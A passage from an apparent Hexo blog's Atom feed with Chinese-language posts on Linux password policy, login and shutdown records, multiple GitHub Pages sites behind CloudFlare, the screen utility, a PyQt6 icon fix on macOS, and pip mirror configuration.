&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;在文件/etc/login.defs中设置 PASS_MIN_LEN，参考值：8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;strong&gt;2 配置口令生存周期&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;在文件/etc/login.defs中设置 PASS_MAX_DAYS，参考值：90&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;strong&gt;3 配置密码复杂度策略&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;  CentOS系统：修改/etc/pam.d/system-auth文件, 在ucredit=-1 lcredit=-1 dcredit=-1 ocredit=-1 选3种，追加到password requisite pam_cracklib.so后面，添加到配置文件中。
    
    </summary>
    
    
      <category term="Linux" scheme="http://yoursite.com/categories/Linux/"/>
    
    
      <category term="Linux" scheme="http://yoursite.com/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>Linux开机和关机记录查看</title>
    <link href="http://yoursite.com/2021/linux%E8%AE%B0%E5%BD%95%E6%9F%A5%E7%9C%8B.html"/>
    <id>http://yoursite.com/2021/linux%E8%AE%B0%E5%BD%95%E6%9F%A5%E7%9C%8B.html</id>
    <published>2021-04-11T07:05:39.000Z</published>
    <updated>2021-04-14T06:23:32.699Z</updated>
    
    <content type="html"><![CDATA[<h3 id="查看最近一次开机时间"><a href="#查看最近一次开机时间" class="headerlink" title="查看最近一次开机时间"></a>查看最近一次开机时间</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; who -b</span><br><span class="line">或者</span><br><span class="line">&gt; last -1 reboot</span><br></pre></td></tr></table></figure><h3 id="查看关机记录"><a href="#查看关机记录" class="headerlink" title="查看关机记录"></a>查看关机记录</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; last -x | grep shutdown <span class="comment">#以关机时间段显示</span></span><br></pre></td></tr></table></figure><h3 id="查看失败登录记录-来源以IP显示"><a href="#查看失败登录记录-来源以IP显示" class="headerlink" title="查看失败登录记录, 来源以IP显示"></a><a id="more"></a>查看失败登录记录, 来源以IP显示</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; sudo lastb -i</span><br></pre></td></tr></table></figure><h3 id="查看系统从上次开机到现在已经运行多久了"><a href="#查看系统从上次开机到现在已经运行多久了" class="headerlink" title="查看系统从上次开机到现在已经运行多久了"></a>查看系统从上次开机到现在已经运行多久了</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; uptime</span><br><span class="line">或者</span><br><span class="line">&gt; w</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;查看最近一次开机时间&quot;&gt;&lt;a href=&quot;#查看最近一次开机时间&quot; class=&quot;headerlink&quot; title=&quot;查看最近一次开机时间&quot;&gt;&lt;/a&gt;查看最近一次开机时间&lt;/h3&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&amp;gt; who -b&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;或者&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;gt; last -1 reboot&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&quot;查看关机记录&quot;&gt;&lt;a href=&quot;#查看关机记录&quot; class=&quot;headerlink&quot; title=&quot;查看关机记录&quot;&gt;&lt;/a&gt;查看关机记录&lt;/h3&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&amp;gt; last -x | grep shutdown &lt;span class=&quot;comment&quot;&gt;#以关机时间段显示&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&quot;查看失败登录记录-来源以IP显示&quot;&gt;&lt;a href=&quot;#查看失败登录记录-来源以IP显示&quot; class=&quot;headerlink&quot; title=&quot;查看失败登录记录, 来源以IP显示&quot;&gt;&lt;/a&gt;
    
    </summary>
    
    
      <category term="Linux" scheme="http://yoursite.com/categories/Linux/"/>
    
    
      <category term="Linux" scheme="http://yoursite.com/tags/Linux/"/>
    
      <category term="Network" scheme="http://yoursite.com/tags/Network/"/>
    
  </entry>
  
  <entry>
    <title>如何拥有多个GitHub Pages</title>
    <link href="http://yoursite.com/2021/gitpage.html"/>
    <id>http://yoursite.com/2021/gitpage.html</id>
    <published>2021-04-08T05:54:46.000Z</published>
    <updated>2021-04-14T06:12:48.668Z</updated>
    
    <content type="html"><![CDATA[<blockquote><h2 id="只能为每个-GitHub-帐户创建一个用户或组织站点；而项目站点没有限制"><a href="#只能为每个-GitHub-帐户创建一个用户或组织站点；而项目站点没有限制" class="headerlink" title="只能为每个 GitHub 帐户创建一个用户或组织站点；而项目站点没有限制"></a>只能为每个 GitHub 帐户创建一个用户或组织站点；而项目站点没有限制</h2></blockquote><p>​    也就是名为 <code>&lt;user&gt;.github.io</code>的仓库。<strong>想要创建更多的GitHub Pages页面，可以通过创建项目站点实现。</strong>项目站点的数量没有限制</p><p>​    有三种类型的 GitHub Pages 站点：项目、用户和组织。 项目站点连接到 GitHub 上托管的特定项目。 用户和组织站点连接到特定的 GitHub 帐户。</p><p>​    要发布用户站点，必须创建名为 <code>&lt;user&gt;.github.io</code> 的用户帐户所拥有的仓库。 要发布组织站点，必须创建名为 <code>&lt;organization&gt;.github.io</code> 的组织所拥有的仓库。 除非您使用自定义域，否则用户和组织站点位于 <code>http(s)://&lt;username&gt;.github.io</code> 或 <code>http(s)://&lt;organization&gt;.github.io</code>。<a id="more"></a></p><h3 id="一、创建项目"><a href="#一、创建项目" class="headerlink" title="一、创建项目"></a>一、创建项目</h3><ol><li>新建一个仓库，名称随意。</li><li>进入仓库主页，点击右面的<code>Settings</code>，找到<strong>GitHub Pages</strong>部分，选择Source&gt;main即可。</li><li>建议勾选 <code>Enforce HTTPS</code>，否则访问时会出现安全警告。</li><li>没有出错的话，一个项目主页就建立完成了，可以通过<code>&lt;username&gt;.github.io/&lt;projectname&gt;</code>访问到了</li></ol><p>这里我新建的项目为<code>TBOsec.github.io/DownGit</code> 。可以看到这个地址有点丑，而且地址对大小写敏感。我希望通过 <code>downgit.h0sec.com</code> 这样更加美观的地址访问，那么就需要设置和绑定子域名。</p><h3 id="二、绑定子域名"><a href="#二、绑定子域名" class="headerlink" title="二、绑定子域名"></a>二、绑定子域名</h3><p><u>通常，当我们购买一个域名后，就可以使用它的子域名。子域名的数量、子域名长度的限制各个域名商会有所不同</u></p><p>以我为例，我的域名为<code>h0sec.com</code>，我希望使用<code>downgit.h0sec.com</code> 这个子域名</p><ol><li>在项目仓库里新建一个<code>CNAME</code>文件，并将不带协议名的裸域名写进去（<code>downgit.h0sec.com</code>而不是<code>https://downgit.h0sec.com/</code>）</li><li>去DNS服务商的网站，给对应的二级域名添加<strong><code>CNAME</code></strong>解析到<code>&lt;username&gt;.github.io</code>（和个人主页的相同）</li><li>等待DNS生效，具体时间和服务商有关 <!--大约几分钟--></li><li>成功后，可以通过更好看的 downgit.h0sec.com` 地址访问到了项目站点了</li></ol><img src="../images/upload/202104081.png" style="zoom:67%;" /><h3 id="三、启用HTTPS"><a href="#三、启用HTTPS" class="headerlink" title="三、启用HTTPS"></a>三、启用HTTPS</h3><p>虽然现在可以通过<code>downgit.h0sec.com</code>访问，但是无法使用https，这是GitHub Pages本身的限制</p><img src="../images/upload/202104082.png" style="zoom:50%;" /><p>首先，为什么要使用 https 协议？因为 https 协议提高网站访问安全性、目前越来越多的浏览器会判断当前站点支不支持https协议。</p><p>​    默认情况下使用GitHub Pages的给定域名则支持http和https两种协议，但是如果使用自定义域名的话，则只能通过<code>http://</code>访问，也就是说我们在<code>Github上搭建 Hexo 或Jekyll 主题博客</code>后，通过<code>CNAME</code>绑定个人域名后，我们只能通过<code>http://</code>域名来访问。</p><p>​    如果访问<code>https://XXX.github.io/</code>(即原来的GitHub Pages域名)将会被重定向到<code>我们的自定义域名</code>。但若直接访问<code>https://我们的自定义域名</code>，浏览器会报<code>SSL_DOMAIN_NOT_MATCHED</code>警告。</p><p><u><strong>那么怎么给自己的域名加上<code>https</code>呢？</strong></u></p><p>​    <strong><a href="https://www.cloudflare.com/zh-cn/" target="_blank" rel="noopener">CloudFlare</a></strong> 是一家CDN提供商，它提供了<code>免费的https服务</code>(但不是应用SSL证书)。实现模式就是，用户到CDN服务器的连接为<code>https</code>，而CDN服务器到GithubPage服务器的连接为<code>http</code>，就是在CDN服务器那里加上反向代理。</p><ol><li>注册并登录CloudFlare，并将自己域名下的<code>name server</code>修改为CloudFlare的<code>name server</code>。</li><li>在CloudFlare的DNS设置域名匹配到自己的GithubPage(启用动态DNS加速)。</li><li>在CloudFlare的<strong><code>SSL/TLS</code></strong>设置SSL/TLS为<code>完全</code>   (等待一定时间实现建立连接后，就可以通过<code>https</code>来访问自己的 GithubPage )。</li><li>在CloudFlare的<code>边缘证书</code>中设置路由规则。一般情况下，设置<code>始终使用HTTPS</code>， 这样就可以把 <code>http</code> 链接强制转换为 <code>https</code>。</li></ol><img src="../images/upload/202104083.png" style="zoom:50%;" /><img src="../images/upload/202104084.png" style="zoom:50%;" /><p>这样不管通过http访问将跳转到https，正常访问</p><img src="../images/upload/202104085.png" style="zoom:50%;" />]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;h2 id=&quot;只能为每个-GitHub-帐户创建一个用户或组织站点；而项目站点没有限制&quot;&gt;&lt;a href=&quot;#只能为每个-GitHub-帐户创建一个用户或组织站点；而项目站点没有限制&quot; class=&quot;headerlink&quot; title=&quot;只能为每个 GitHub 帐户创建一个用户或组织站点；而项目站点没有限制&quot;&gt;&lt;/a&gt;只能为每个 GitHub 帐户创建一个用户或组织站点；而项目站点没有限制&lt;/h2&gt;&lt;/blockquote&gt;
&lt;p&gt;​    也就是名为 &lt;code&gt;&amp;lt;user&amp;gt;.github.io&lt;/code&gt;的仓库。&lt;strong&gt;想要创建更多的GitHub Pages页面，可以通过创建项目站点实现。&lt;/strong&gt;项目站点的数量没有限制&lt;/p&gt;
&lt;p&gt;​    有三种类型的 GitHub Pages 站点：项目、用户和组织。 项目站点连接到 GitHub 上托管的特定项目。 用户和组织站点连接到特定的 GitHub 帐户。&lt;/p&gt;
&lt;p&gt;​    要发布用户站点，必须创建名为 &lt;code&gt;&amp;lt;user&amp;gt;.github.io&lt;/code&gt; 的用户帐户所拥有的仓库。 要发布组织站点，必须创建名为 &lt;code&gt;&amp;lt;organization&amp;gt;.github.io&lt;/code&gt; 的组织所拥有的仓库。 除非您使用自定义域，否则用户和组织站点位于 &lt;code&gt;http(s)://&amp;lt;username&amp;gt;.github.io&lt;/code&gt; 或 &lt;code&gt;http(s)://&amp;lt;organization&amp;gt;.github.io&lt;/code&gt;。
    
    </summary>
    
    
      <category term="Programming" scheme="http://yoursite.com/categories/Programming/"/>
    
    
      <category term="Network" scheme="http://yoursite.com/tags/Network/"/>
    
      <category term="git" scheme="http://yoursite.com/tags/git/"/>
    
  </entry>
  
  <entry>
    <title>screen后台运行程序</title>
    <link href="http://yoursite.com/2021/screen.html"/>
    <id>http://yoursite.com/2021/screen.html</id>
    <published>2021-03-15T05:01:17.000Z</published>
    <updated>2021-04-16T05:57:59.093Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>常常需要远程登录到Linux 服务器，运行一些需要很长时间才能完成的任务，在此期间不能关掉窗口或者断开连接，否则这个任务就会被杀掉，一切半途而废了。</p></blockquote><p>screen命令可以实现当前窗口与任务分离，即使离线了，服务器仍在后台运行任务。当重新登录服务器，可以读取窗口线程，重新连接任务窗口 <a id="more"></a></p><h2 id="主要功能："><a href="#主要功能：" class="headerlink" title="主要功能："></a>主要功能：</h2><ul><li>会话恢复</li></ul><p>只要Screen本身没有终止，在其内部运行的会话都可以恢复。这一点对于远程登录的用户特别有用——即使网络连接中断，用户也不会失去对已经打开的命令行会话的控制。只要再次登录到主机上执行screen -r就可以恢复会话的运行。同样在暂时离开的时候，也可以执行分离命令detach，在保证里面的程序正常运行的情况下让Screen挂起（切换到后台）。这一点和图形界面下的VNC很相似。</p><ul><li>多窗口</li></ul><p>在Screen环境下，所有的会话都独立的运行，并拥有各自的编号、输入、输出和窗口缓存。用户可以通过快捷键在不同的窗口下切换，并可以自由的重定向各个窗口的输入和输出。Screen实现了基本的文本操作，如复制粘贴等；还提供了类似滚动条的功能，可以查看窗口状况的历史记录。窗口还可以被分区和命名，还可以监视后台窗口的活动。</p><ul><li>会话共享</li></ul><p>Screen可以让一个或多个用户从不同终端多次登录一个会话，并共享会话的所有特性（比如可以看到完全相同的输出）。它同时提供了窗口访问权限的机制，可以对窗口进行密码保护。</p><h2 id="screen的使用："><a href="#screen的使用：" class="headerlink" title="screen的使用："></a>screen的使用：</h2><h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><p>一般的linux系统都会自带screen,如果没有安装的话，使用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get install screen</span><br></pre></td></tr></table></figure><p>或</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo yum install screen</span><br></pre></td></tr></table></figure><h4 id="新建窗口"><a href="#新建窗口" class="headerlink" title="新建窗口"></a>新建窗口</h4><p>新建窗口有<code>3</code>种办法</p><p>第一种：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ screen</span><br><span class="line">这样就可以新建窗口，进入到一个窗口中，但是这样窗口就没有名字，无法区分他们</span><br></pre></td></tr></table></figure><p>第二种：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ screen -S name </span><br><span class="line">例如：screen -S count 新建了一个叫count的窗口并进入</span><br><span class="line">这样新建一个名字为name的窗口，并入到该窗口中</span><br></pre></td></tr></table></figure><p>第三种：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ screen command</span><br><span class="line">例如：screen python .&#x2F;a.py 新建并执行a.py程序</span><br><span class="line">这样新建一个窗口并在窗口中执行command，同样没有名字</span><br></pre></td></tr></table></figure><h4 id="会话分离"><a href="#会话分离" class="headerlink" title="会话分离"></a>会话分离</h4><p>当一个窗口运行某个程序之后，想退出登录，让程序在后台运行。这时就需要和窗口会话分离,有<code>2</code>种方式：</p><p>第一种：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ctrl+a+d</span><br><span class="line">在当前会话窗口中按Ctrl+a+d快捷键可以实现分离，这时窗口会弹出[detached]的提示，并回到主窗口</span><br></pre></td></tr></table></figure><p>第二种：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ screen -d name </span><br><span class="line">远程detach某个session,前提是已经跳出了name窗口</span><br></pre></td></tr></table></figure><h4 id="恢复会话窗口"><a href="#恢复会话窗口" class="headerlink" title="恢复会话窗口"></a>恢复会话窗口</h4><p>首先查看有哪些窗口正在运行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ screen -ls </span><br><span class="line">列出窗口列表</span><br></pre></td></tr></table></figure><p><img src="../images/upload/screen1.png" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ screen -r 22059</span><br><span class="line">进入22059线程，恢复test会话</span><br></pre></td></tr></table></figure><p>这样就能回到test窗口了</p><h4 id="杀死会话窗口"><a href="#杀死会话窗口" class="headerlink" title="杀死会话窗口"></a>杀死会话窗口</h4><p>如果想要关掉某个窗口，有<code>3</code>种方法：</p><p>第一种：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ kill -9 threadnum</span><br><span class="line">例如上面的22059，kill -9 22059即可杀死线程</span><br></pre></td></tr></table></figure><p>第二种：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ctrl+a+k</span><br><span class="line">杀死当前窗口和窗口中运行的程序</span><br></pre></td></tr></table></figure><p>第三种：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ ctrl+a 进入命令模式，然后输入quite命令</span><br><span class="line">$ quite</span><br><span class="line">这样退出会杀死所有窗口并退出运行的所有程序</span><br></pre></td></tr></table></figure><h4 id="清除死去的窗口"><a href="#清除死去的窗口" class="headerlink" title="清除死去的窗口"></a>清除死去的窗口</h4><p>当窗口被杀死后，再用screen -ls 可以看到该窗口后面的(???dead)字样，说明窗口死了，但是仍在占用空间。这时需要清除窗口</p><p><img src="../images/upload/screen2.png" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ screen -wipe</span><br><span class="line">自动清除死去的窗口</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;常常需要远程登录到Linux 服务器，运行一些需要很长时间才能完成的任务，在此期间不能关掉窗口或者断开连接，否则这个任务就会被杀掉，一切半途而废了。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;screen命令可以实现当前窗口与任务分离，即使离线了，服务器仍在后台运行任务。当重新登录服务器，可以读取窗口线程，重新连接任务窗口
    
    </summary>
    
    
      <category term="Linux" scheme="http://yoursite.com/categories/Linux/"/>
    
    
      <category term="Linux" scheme="http://yoursite.com/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>macOS下PyQt6图标icon无法显示</title>
    <link href="http://yoursite.com/2021/PyQt6%E5%9B%BE%E6%A0%87.html"/>
    <id>http://yoursite.com/2021/PyQt6%E5%9B%BE%E6%A0%87.html</id>
    <published>2021-03-01T07:22:05.000Z</published>
    <updated>2021-04-14T06:12:48.666Z</updated>
    
    <content type="html"><![CDATA[<p>刚使用PyQt6时遇到图标无法显示问题，几番查询总算解决，直接看代码<a id="more"></a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> PyQt6.QtCore <span class="keyword">import</span> QFile</span><br><span class="line"><span class="keyword">from</span> PyQt6.QtGui <span class="keyword">import</span> QIcon, QPixmap</span><br><span class="line"><span class="keyword">from</span> PyQt6.QtWidgets <span class="keyword">import</span> QApplication, QPushButton, QWidget</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyIcon</span><span class="params">(QWidget)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        super().__init__()</span><br><span class="line">        self.setupGUI()  <span class="comment">#创建窗口</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">setupGUI</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.setWindowTitle(<span class="string">'Icon'</span>)</span><br><span class="line">        self.resize(<span class="number">400</span>, <span class="number">200</span>)  <span class="comment">#设置窗口大小</span></span><br><span class="line">        <span class="comment"># self.setWindowIcon(QIcon('./alarm.svg')))</span></span><br><span class="line">        </span><br><span class="line">        button = QPushButton(QIcon(<span class="string">'./alarm.svg'</span>), <span class="string">'Click me'</span>, self)</span><br><span class="line">        button.setToolTip(<span class="string">"This is Click"</span>)</span><br><span class="line">        button.setGeometry(<span class="number">150</span>, <span class="number">100</span>, <span class="number">100</span>, <span class="number">50</span>)  <span class="comment">#设置按钮坐标和大小</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app = QApplication(sys.argv)</span><br><span class="line">    path = <span class="string">'./alarm.svg'</span></span><br><span class="line">    app.setWindowIcon(QIcon(QPixmap(path)))  <span class="comment"># MAC下程序图标是显示在程序坞中，切记!</span></span><br><span class="line"></span><br><span class="line">    form = MyIcon()</span><br><span class="line">    form.show()</span><br><span class="line"></span><br><span class="line">    sys.exit(app.exec())  <span class="comment">#退出主循环</span></span><br></pre></td></tr></table></figure><p>setWindowIcon是QApplication的方法，而不是QWidget的，所以使用app.setWindowIcon设置是对的<br>注意：<font color=red>在macOS下，图标是显示在程序坞中！！！</font>&gt;</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;刚使用PyQt6时遇到图标无法显示问题，几番查询总算解决，直接看代码
    
    </summary>
    
    
      <category term="Programming" scheme="http://yoursite.com/categories/Programming/"/>
    
    
      <category term="python" scheme="http://yoursite.com/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>pip更换国内源</title>
    <link href="http://yoursite.com/2021/python%E6%9B%B4%E6%8D%A2%E6%BA%90.html"/>
    <id>http://yoursite.com/2021/python%E6%9B%B4%E6%8D%A2%E6%BA%90.html</id>
    <published>2021-02-02T16:00:00.000Z</published>
    <updated>2021-04-14T06:12:48.664Z</updated>
    
    <content type="html"><![CDATA[<h3 id="pip国内的一些镜像"><a href="#pip国内的一些镜像" class="headerlink" title="pip国内的一些镜像"></a>pip国内的一些镜像</h3><ul><li>阿里云 <a href="http://mirrors.aliyun.com/pypi/simple/?spm=a2c6h.12873639.0.0.22b62cdbVtYOZm" target="_blank" rel="noopener">http://mirrors.aliyun.com/pypi/simple/</a></li><li>中国科技大学 <a href="https://pypi.mirrors.ustc.edu.cn/simple/" target="_blank" rel="noopener">https://pypi.mirrors.ustc.edu.cn/simple/</a></li><li>豆瓣(douban) <a href="http://pypi.douban.com/simple/" target="_blank" rel="noopener">http://pypi.douban.com/simple/</a></li><li>清华大学 <a href="https://pypi.tuna.tsinghua.edu.cn/simple/" target="_blank" rel="noopener">https://pypi.tuna.tsinghua.edu.cn/simple/</a></li><li>中国科学技术大学 <a href="http://pypi.mirrors.ustc.edu.cn/simple/" target="_blank" rel="noopener">http://pypi.mirrors.ustc.edu.cn/simple/</a></li></ul><p><u>提示：若担心安全问题可使用HTTPS加密源</u></p><h3 id="修改源的方法"><a href="#修改源的方法" class="headerlink" title="修改源的方法"></a>修改源的方法</h3><h4 id="临时使用："><a href="#临时使用：" class="headerlink" title="临时使用："></a>临时使用：</h4><p>Linux Mac Windows通用命令<a id="more"></a></p><p>可以在使用pip时在后面加上-i参数，指定pip源</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install Openpyxl -i https:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;pypi&#x2F;simple&#x2F;</span><br></pre></td></tr></table></figure><p><u>注意：如果使用非HTTPS源，需加上–trusted-host参数</u><br>如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install django -i http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;pypi&#x2F;simple&#x2F; --trusted-host mirrors.aliyun.com</span><br></pre></td></tr></table></figure><h4 id="永久修改："><a href="#永久修改：" class="headerlink" title="永久修改："></a>永久修改：</h4><p><strong>Linux:</strong></p><p>修改pip.cof文件(没有就创建一个)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$HOME&#x2F;.config&#x2F;pip&#x2F;pip.conf</span><br></pre></td></tr></table></figure><p>修改内容如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[global]</span><br><span class="line">index-url &#x3D; https:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;pypi&#x2F;simple&#x2F;</span><br></pre></td></tr></table></figure><p><strong>Mac:</strong></p><p>修改pip.conf文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$HOME&#x2F;Library&#x2F;Application Support&#x2F;pip&#x2F;pip.conf</span><br></pre></td></tr></table></figure><p>如果没有上面的目录,在如下目录创建 pip.conf</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[global]</span><br><span class="line">index-url &#x3D; https:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;pypi&#x2F;simple&#x2F;</span><br></pre></td></tr></table></figure><p><strong>Windows:</strong><br>修改 pip.conf 文件 (没有就创建一个)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%APPDATA%\pip\pip.ini</span><br></pre></td></tr></table></figure><p>修改内容如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[global]</span><br><span class="line">index-url &#x3D; https:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;pypi&#x2F;simple&#x2F;</span><br></pre></td></tr></table></figure><p><font color=green><u>若使用非HTTPS源需在文件中加入</u></font></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[install]</span><br><span class="line">trusted-host&#x3D;mirrors.aliyun.com</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;pip国内的一些镜像&quot;&gt;&lt;a href=&quot;#pip国内的一些镜像&quot; class=&quot;headerlink&quot; title=&quot;pip国内的一些镜像&quot;&gt;&lt;/a&gt;pip国内的一些镜像&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;阿里云 &lt;a href=&quot;http://mirrors.aliyun.com/pypi/simple/?spm=a2c6h.12873639.0.0.22b62cdbVtYOZm&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://mirrors.aliyun.com/pypi/simple/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;中国科技大学 &lt;a href=&quot;https://pypi.mirrors.ustc.edu.cn/simple/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://pypi.mirrors.ustc.edu.cn/simple/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;豆瓣(douban) &lt;a href=&quot;http://pypi.douban.com/simple/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://pypi.douban.com/simple/&lt;/a&gt;&lt;/li&gt;
